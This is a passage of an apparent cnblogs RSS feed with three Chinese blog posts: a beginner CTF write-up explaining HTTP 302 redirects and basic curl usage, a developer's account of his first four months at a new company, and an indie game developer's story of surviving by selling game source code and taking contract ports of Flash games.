&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/c1ata/imgbed2020/img/3hm05896hU.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击给出的链接后，没有发生任何变化。&lt;/p&gt;
&lt;h3 id=&quot;解决方案&quot;&gt;解决方案&lt;/h3&gt;
&lt;p&gt;通过擦好看网络请求，可以发现发生了302临时跳转，所以我们无法通过浏览器直接访问未跳转的页面，而flag 可能藏在我们目前无法访问的页面之中。所以我们要想办法去访问未跳转的原网站。&lt;/p&gt;
&lt;p&gt;而不强制跳转我们可以通过&lt;code&gt;curl&lt;/code&gt;指令来完成。因为curl默认是不跟随重定向的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/c1ata/imgbed2020/img/mintty_44OnBwuySR.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;成功在命令行中找出flag；&lt;/p&gt;
&lt;h3 id=&quot;相关知识&quot;&gt;相关知识&lt;/h3&gt;
&lt;h4 id=&quot;什么是http-302-跳转？&quot;&gt;什么是HTTP 302 跳转？&lt;/h4&gt;
&lt;p&gt;首先我们要知道&lt;strong&gt;状态码&lt;/strong&gt;，状态码是HTTP请求过程&lt;strong&gt;结果的描述&lt;/strong&gt;，由三位数字组成。这三位数字描述了请求过程中所发生的情况。状态码位于&lt;strong&gt;响应的起始行&lt;/strong&gt;中，如在 HTTP/1.0 200 OK 中，状态码就是 200。&lt;/p&gt;
&lt;p&gt;每个状态码的&lt;strong&gt;第一位数字&lt;/strong&gt;都用于描述状态（“成功”、“出错”等）。如200 到 299 之间的状态码表示成功；300 到 399 之间的代码表示资源已经转移。400 到 499 之间的代码表示客户端的&lt;strong&gt;请求出错&lt;/strong&gt;了。500 到 599 之间的代码表示&lt;strong&gt;服务器出错&lt;/strong&gt;了。&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;整体范围&lt;/th&gt;
&lt;th&gt;已定义范围&lt;/th&gt;
&lt;th&gt;分　　类&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;100～199&lt;/td&gt;
&lt;td&gt;100～101&lt;/td&gt;
&lt;td&gt;信息提示&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;200～299&lt;/td&gt;
&lt;td&gt;200～206&lt;/td&gt;
&lt;td&gt;成功&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;300～399&lt;/td&gt;
&lt;td&gt;300～305&lt;/td&gt;
&lt;td&gt;重定向&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;400～499&lt;/td&gt;
&lt;td&gt;400～415&lt;/td&gt;
&lt;td&gt;客户端错误&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;500～599&lt;/td&gt;
&lt;td&gt;500～505&lt;/td&gt;
&lt;td&gt;服务器错误&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;那么302就属于重定向的状态码，它表示你要访问的资源在别的地方。&lt;/p&gt;
&lt;p&gt;|301 |Moved Permanently |在请求的URL已被移除时使用。响应的Location首部中应该包含资源现在所处的URL|&lt;br/&gt;| ---- | ---- |&lt;br/&gt;|302 |Found |与301状态码类似；但是，客户端应该使用Location首部给出的URL来临时定位资源。将来的请求仍应使用老的URL|&lt;/p&gt;
&lt;p&gt;302表示临时重定向，而301表示永久重定向；&lt;/p&gt;
&lt;p&gt;PHP 302 跳转代码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    header(&quot;HTTP/1.1 302 found&quot;); 
    header(&quot;Location:https://www.baidu.com&quot;);
    exit();
?&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;PHP 301 跳转代码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    header(&quot;HTTP/1.1 301 Moved Permanently&quot;); 
    header(&quot;Location: http://www.baidu.com/&quot;); 
    exit(); 
?&amp;gt;    
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;curl-指令&quot;&gt;curl 指令&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;curl&lt;/code&gt;是一种命令行工具，作用是&lt;strong&gt;发出网络请求&lt;/strong&gt;，然后&lt;strong&gt;得到和提取数据&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;我们直接在&lt;code&gt;curl命令&lt;/code&gt;后加上网址，就可以看到网页源码。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;curl www.baidu.com
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-Html&quot;&gt;$ curl www.baidu.com
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2381  100  2381    0     0  20350      0 --:--:-- --:--:-- --:--:-- 20350&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;!--STATUS OK--&amp;gt;&amp;lt;html&amp;gt; &amp;lt;head&amp;gt;&amp;lt;meta http-equiv=content-type content=text/html;charset=utf-8&amp;gt;&amp;lt;meta http-equiv=X-UA-Compatible content=IE=Edge&amp;gt;&amp;lt;meta content=always name=referrer&amp;gt;
   ......
    
    
 &amp;lt;/html&amp;gt;

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;curl 默认是不进行重定向的。如果要进行重定向，我们需要加上-L参数&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;curl -L taobao.com
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;加上 &lt;code&gt;-o 参数&lt;/code&gt;可以保存网页源代码到本地&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;curl -o taobao.txt taobao.com -L
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;加上&lt;code&gt;-i参数&lt;/code&gt;可以看到&lt;strong&gt;响应报文&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;curl -i baidu.com
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-html&quot;&gt;$ curl -i baidu.com
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    81  100    81    0     0    627      0 --:--:-- --:--:-- --:--:--   627HTTP/1.1 200 OK
Server:
Date: Wed, 25 Mar 2020 16:00:02 GMT
Content-Type: text/html
Content-Length: 81
Connection: keep-alive
Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
ETag: &quot;51-47cf7e6ee8400&quot;
Accept-Ranges: bytes

&amp;lt;html&amp;gt;
&amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.baidu.com/&quot;&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;除此之外，curl 的功能远不止如此。以后再慢慢研究。&lt;/p&gt;
</description>
<pubDate>Wed, 25 Mar 2020 16:12:00 +0000</pubDate>
<dc:creator>c1ata</dc:creator>
<og:description>HTTP——302临时重定向 题目描述 点击给出的链接后，没有发生任何变化。 解决方案 通过擦好看网络请求，可以发现发生了302临时跳转，所以我们无法通过浏览器直接访问未跳转的页面，而flag 可能藏</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/dedragon/p/12571728.html</dc:identifier>
</item>
<item>
<title>进入新公司的四个月 - 丶Pz</title>
<link>http://www.cnblogs.com/panzi/p/12571676.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/panzi/p/12571676.html</guid>
<description>&lt;h2 id=&quot;入职&quot;&gt;入职&lt;/h2&gt;
&lt;p&gt;2019年11月21我怀着无比激动的心情前去公司报道，本以为就是一个几分钟的入职手续，结果办理了一上午，而且与我一起入职的还有四十多个人。当我手里拿着入职指导小册和两份未填写的入职材料还有一个崭新的MAC时，不怕大家笑话，没有大厂经历的我仿佛就像刘姥姥进大观园一样。尤其是给我们办理入职手续的小姐姐一口一个同学让我有点不适应。入职手续大概办理了两个多小时，还算比较顺利。&lt;/p&gt;
&lt;p&gt;来到我的工位上，打开MAC，注册各种账号，了解各种流程，申请显示器，转接头等设备，后续我又把自己的鼠标键盘带到了公司，开启了我的新的征程。&lt;/p&gt;
&lt;h2 id=&quot;同事&quot;&gt;同事&lt;/h2&gt;
&lt;p&gt;我的同事基本上都是从其他大厂跳过来的大牛，职级也都是比我高的，让我多多少少有了些压力，但是更多的是兴奋，毕竟与这些大牛一起合作也是非常棒的一种体验，后来发现歪瓜裂枣也是有的。不过我很佩服那几个95后，他们真的很棒，学习的知识深度和广度有的我都达不到，未来可期啊。&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;环境&lt;/h2&gt;
&lt;p&gt;环境自然没的说，要啥有啥，不过个人感觉几乎用不到，毕竟公司是工作的地方，大部分时间都是在自己的工位上，好不容易去了一次休息室休息，结果被一个呼噜大神吵得一中午没睡着。公司还有健身房，以前还花钱去办健身卡，结果公司免费的健身房然而自己并不想去。食堂的菜还是蛮不错的，晚上加班餐免费哦（重点是要加班！！！）。&lt;/p&gt;
&lt;h2 id=&quot;第一个月&quot;&gt;第一个月&lt;/h2&gt;
&lt;p&gt;很幸运，刚入职就接手一个新项目。当我满心期待开始准备大展身手的时候，发现离敲代码还有十万八千里。开会，需求评审会，需求介绍会，技术评审会，技术方案讨论会，反正是各种大大小小的会议。两天一小会，三天一大会，接下来就是写文档。就这样，第一个月基本是在写接口文档，项目文档中度过了。这个月，大概了解了一个项目诞生的部分流程，慢慢的我发现写文档也是一件挺有意思的事情，当然我最关注的还是开发部分。&lt;/p&gt;
&lt;h2 id=&quot;第二个月&quot;&gt;第二个月&lt;/h2&gt;
&lt;p&gt;第二个月开始步入了开发阶段，定了开发计划，大概是20多天的样子。好像我记得是三天左右就把核心框架流程搭建完了，最复杂的还是业务，而且有些业务晦涩难懂，理解错了就开发错了，要推倒重来。所以业务部分是最占用时间的。我负责的是一个对外接口的模块，也就是第一个月里面其中一个接口文档的实现。从进入开发阶段，学习了整个项目的规范。配置文件如何存放，各种shell脚本，除了引用公司业务部门通用的jar包以外，其他的业务代码都是按照自己的习惯去写，所以在开发这块倒是没有遇到一些难点，主要就是接入公司的一些中间件之类的东西。从开发过程中，我发现了理解业务的重要性以及开发文档的重要性，另外还要与外部公司的开发人员做对接工作。开发完差不多就该放春节了。&lt;/p&gt;
&lt;h2 id=&quot;第三个月&quot;&gt;第三个月&lt;/h2&gt;
&lt;p&gt;春节加上疫情，公司启动了远程工作机制。视频会议必不可少，虽然是远程工作，但感觉并不比在公司轻松多少，这个月是QA测试月，每天就是讨论问题，修复BUG，实现新需求等。可以说整个疫情期间配合着QA完成了测试工作。另外由于测试环境没有自动部署这些Web控制台，每次都需要QA手动拉去代码并执行启动脚本，所以闲暇之余又给QA的小伙伴们做了个一键部署的功能。也可能是我太闲了，毕竟也不是每天都改BUG嘛。&lt;/p&gt;
&lt;h2 id=&quot;第四个月&quot;&gt;第四个月&lt;/h2&gt;
&lt;p&gt;继续配合QA测试修改，没有什么新的东西。最后临上线之前，开始接触上线流程，申请弹性云，熟悉上线平台流程和注意事项，用预发环境做练习。有那么几天是打包，部署，打包，部署重复的工作。3.25号是系统上线的日子，去了公司，沟通更加方便一些。也是遇到了一些问题，不过毕竟一起讨论问题效率会更高一些。上线之后又配置了监控报警和日志采集等，项目算是顺利上线了。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;其实东西应该挺多的，但是发现自己却写不出。整体的感觉就是大公司在各种技术的支持上是很不错的，各种东西都有专门的部门负责，另外公司的人文关怀也很到位，在疫情的处理上也是细节满满。自己也非常开心能够在这种环境下工作。随便写了些东西，有些杂乱和潦草，将就着看吧~~&lt;/p&gt;
</description>
<pubDate>Wed, 25 Mar 2020 15:57:00 +0000</pubDate>
<dc:creator>丶Pz</dc:creator>
<og:description>入职 2019年11月21我怀着无比激动的心情前去公司报道，本以为就是一个几分钟的入职手续，结果办理了一上午，而且与我一起入职的还有四十多个人。当我手里拿着入职指导小册和两份未填写的入职材料还有一个崭</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/panzi/p/12571676.html</dc:identifier>
</item>
<item>
<title>大龄个人开发者，我是如何活下来的，又将怎样活下去 - 张晓衡</title>
<link>http://www.cnblogs.com/creator-star/p/12571656.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/creator-star/p/12571656.html</guid>
<description>&lt;p&gt;​“&lt;strong&gt;一个游戏多份收益，助力开发者技术精进，副业挣钱&lt;/strong&gt;”&lt;/p&gt;
&lt;p&gt;晓衡经过了两年多的全职亲身实践与探索，在2020年3月开发终于开始盈利了！&lt;/p&gt;
&lt;p&gt;这是收到腾讯的2月的结算单，下图是2月1~2月15日的结算情况 &lt;strong&gt;514.33&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235115597-1697770663.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中3个是微信小游戏，一个是你现在看到的公众号&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235116016-1660649702.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;也许是受疫情的影响，2月下半个月的小游戏收入，高达&lt;strong&gt;1882.85&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235116368-1525136405.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中的《》是我在过年期间，耗时近1个月开发的，同时为所有游戏增加了跳转链接。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235116860-158499897.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;以上这点收入估计对很多人来说，都会嗤之以鼻， 2300+ 连一个人的生活费都不够，不过还是让晓衡很兴奋，因为这半个月超越了我一年的小游戏收入。&lt;/p&gt;
&lt;p&gt;高兴归高兴，依然要面对现实“&lt;strong&gt;如何养活自己****？&lt;/strong&gt;”时刻是悬在心中的一把剑！让我不敢松懈下来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235117219-255994777.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在此期间，有朋友多次问过晓衡，看中《》还是些内容，想用它做苹果 App 的马甲包，谈了两次虽然心中不舍得，但为了生存下去，还是答应了。&lt;/p&gt;
&lt;p&gt;在2月29日，我在我们的游戏联盟群里发了一条消息，将《》源码出售，群里的伙伴仅299元，而且晓衡还提供相关的技术文档和资料。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235117766-2002981458.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;晓衡微店上的肖尧大佬的收比我还高，反正自己也豁出了，看看有没伙伴愿意一起来玩的，我在群里号召大家。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235118295-1240950518.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在2月期间，晓衡除了自己做小游戏，还将之前录制的一套《Creator 游戏开发零基础视频教程》发布到了公众号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235119007-795499907.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;事后总结，是因为疫情这段时间，晓衡在公众号上发的视频教程、口罩头像源码这些内容，为微店带来了客户，所以决定把《球球要回家大冒险》给卖了，多少能回点血吧！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235119569-1462460559.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3月1日~3日，出售了8单，到目前共出了13单，一下子缓解了晓衡的经济压力&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235119888-304270771.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;同时，晓衡在公众号上持续输出【球球要回家】的视频教程，也为其它游戏源码商品带来了曝光机会，其中成语也带出了5单&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235120289-1034421968.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;【峭壁】带出了4单&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235120588-1228308781.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;晓衡的消除游戏，更是带出17单&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235120829-1356737241.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在看到真实的数据之下，群里面的伙伴们开始踊跃起来，也有一直关注公众号的伙伴，向晓衡提供货源。&lt;/p&gt;
&lt;p&gt;【旺旺食神猪】与晓衡的球球同类玩法，但美术效果更好，刚出来几天就把晓衡的球球给虐了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235121085-468083366.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再后面的「战狼小峰」的加入，为微店带来了新的游戏品类，上架就有人下单&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235121438-633123196.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;「e梦工坊」独立游戏团队，自己开发运营了近一年的两款游戏，亏的一地鸡毛，成了微店的镇店之宝，特别是《宝宝当学霸》访客数与停留时长都很惊人，看下图，这两个游戏源码为「e梦工坊」上 W 的进账，终于让创始人有机会可以开心吃麻辣烫了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235121804-591222248.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;熊孩子的「一刀切」是晓衡微店的首款物理游戏，一上架就受到大家追捧，3天时间出货12单，目前共14单，超过他上线平台1年多的运营收。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235122064-1848999429.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;有朋友找到晓衡，希望能打折或私下付款，不好意思，晓衡现在责任重大，一直以来的愿景都是希望做一些有价值的事情，下图是我在&lt;strong&gt;2018年9月3日&lt;/strong&gt;发的一篇公众号文章，当时公众号只有550个关注，写下这些大言不惭文字。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235122493-1281835888.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我也不知道当时哪来的勇气，&lt;strong&gt;但是写下的字字句句都在潜移默化地影响着自己&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在此期间，晓衡又观察到微店的&lt;strong&gt;流量数据&lt;/strong&gt;和&lt;strong&gt;用户体验&lt;/strong&gt;，一时间有了更多的想法，下面是2月23日~3月23日的微店访问数据，&lt;strong&gt;最高一天的访客数量有近590+人，浏览量高达1600+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235123134-479003981.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;同时不少顾客来咨询晓衡，问的最多的是：&lt;/p&gt;
&lt;p&gt;其实在每个商品详情中都有说明，依然每天都会遇到上面这些问题，再结合&lt;strong&gt;微店流量统计数据&lt;/strong&gt;，晓衡在想，能否提供一个游戏源码试玩+购买+教程的一站式体验，于是在24小时中，我找到游戏联盟的伙伴们，一起开发了下面这个小程序App。小程序中的&lt;strong&gt;logo&lt;/strong&gt;、&lt;strong&gt;图片&lt;/strong&gt;都是我做的，请不要打我，虽然有些丑&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235123427-163049683.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;小程序主界面是一个游戏列表，顶部是一群帅气超级Creator开发者，然后是每个开发者的作品，开发者的名字&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235124074-657207252.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下图是游戏详情界面，上半部分是游戏截图与介绍&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235124676-1589188325.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;详情界面的下半部分，是包含游戏源码的体验+购买+公众号教程三大入口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235125315-1223438427.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;风风火火地，后面花了两天时间填充数据、优化 UI 界，上周5晚上提审...两天半的等待，结果... 审核不通过&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235125530-1923308920.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;，理由是：**“不建议开发盒子形态小程序”...**&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235125798-162830428.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;晓衡的游戏开发公众号、小游戏上大量的&lt;strong&gt;微信小游戏开发教程&lt;/strong&gt;&lt;strong&gt;和&lt;/strong&gt;实战视频，以及众多的开发者，也算是给腾讯的微信小游戏生态做出了不可磨灭的贡献，我们可不是一般的盒子呀！腾讯爸爸希望你能看到这篇文章，能看完最好。&lt;/p&gt;
&lt;p&gt;在微店盈利半个多月时间里，晓衡每天只能睡上四五个小时，早上6点左右起来给大家的游戏做视频，写公众号文章。下午开始迎接顾客，与更多的开发者交流，凌晨都有人来咨询或询问一些技术方面的问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235126182-521855479.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;同时不停的在想尽目前能做的到各种方法，曝光大家的作品，将游戏源码教程视频发布到各BiliBili、西瓜视频、抖音、腾讯视频等各大媒体平台，学起了拼多多，做了一个特别 low 的海报。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235126519-632653185.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;宣传海报1.0V&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;凡事没有一帆风顺的，也有人说你就是个代码贩子、卖源码的，但我不这样认为。&lt;/p&gt;
&lt;p&gt;晓衡卖源码确实是不得已为之，但我觉得我并不是卖的源码，而是&lt;strong&gt;知识服务的一种另外的表现方式。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;受益的不是我一个人，&lt;/strong&gt;而是一群&lt;/p&gt;
&lt;p&gt;热爱学习的个人&lt;/p&gt;
&lt;p&gt;希望降低成本的小企业&lt;/p&gt;
&lt;p&gt;发展个人副业的开发者&lt;/p&gt;
&lt;p&gt;同时晓衡也在鼓励上架微店的开发者们，能更多地去创作写&lt;strong&gt;技术文章、&lt;/strong&gt;录制视频教程，同时帮助大家接单，在群里我被大家戏称为“&lt;strong&gt;攻城狮经经纪人&lt;/strong&gt;”。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235126985-4501241.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;为了树立更为正面的形像，我将宣传海报又升级了一个版本，看下是不是要酷多了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235127712-340105432.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;宣传海报1.1V&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;出售自己的游戏源码是逼不得已，而且晓衡也知道，这样做很可能是杀鸡取卵不能持久！&lt;/p&gt;
&lt;p&gt;出售游戏源码绝对不能是唯一的运营内容，更重要的是&lt;strong&gt;曝光开发者们的能力&lt;/strong&gt;，并&lt;strong&gt;帮助他们能挣到钱。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目前能做的就是，帮助大家做小游戏的二次开发或定制项目，能帮助大家“接单”才行。&lt;/p&gt;
&lt;p&gt;不过定制接单那有那么容易，很多次与金主倒头就睡聊了两三天，将需求、方案、报价整理出来了。到最后能成事的3%的成功率都不到，而且劳心劳力，精神状态像过山车...一时飞在天上，一时跌入谷底...&lt;/p&gt;
&lt;p&gt;凡事都有&lt;strong&gt;从量变到质变&lt;/strong&gt;的过程，随着晓衡微店的持续曝光迎来大家的信任，最近接到一个非常有趣的单子&lt;/p&gt;
&lt;p&gt;“&lt;strong&gt;几百个Flash小游戏移植CocosCreator&lt;/strong&gt;”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235128258-1582905924.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2~5岁的儿童小游戏，几百个的工作量是晓衡个人难以完成的，一是为了帮助金主解决当下的困难，节省时间二来也想到游戏联盟的伙伴们&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235128791-1029569418.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我担起了“&lt;strong&gt;攻城狮经济人&lt;/strong&gt;”的重担而且这位金主也非常爽快，以一个游戏150~300的价格，谈成此事。&lt;/p&gt;
&lt;p&gt;游戏大多都很简单，一个有经验的开发者1~3个小时就能做出来一个，而且游戏都非常有趣，不枯燥。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235129780-449113477.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;后面就是大家开始选择自己擅长的游戏来做，简单的一个人一天可以做到3个以上&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235130659-1554893090.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;要开始干活了，但伙伴们还是很担心的是“💰”的问题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235130954-477107256.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这位金主自己也是开发出生，非常耿直，直接先付款，后干活，直接就把钱交给了晓衡，让我来安排任务。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235131401-2053944097.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;大家都很谦让，伙伴「小刀」为了给女儿挣奶粉钱，「波波」将他接的任务让了出来，大家都是暧心男！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235131903-1569968465.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;「小刀」用了两三个小时就做好了，而且会在群里讨论如何能做的更好&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235132167-216065748.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第二天大家都交了作业，我也向金主确认一下情况，得到极好的评价&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235132380-1262043426.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235132758-597515327.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;一天后，大家都不手软了，觉得肉不够吃，抢着接任务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1755688/202003/1755688-20200325235133029-838527482.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
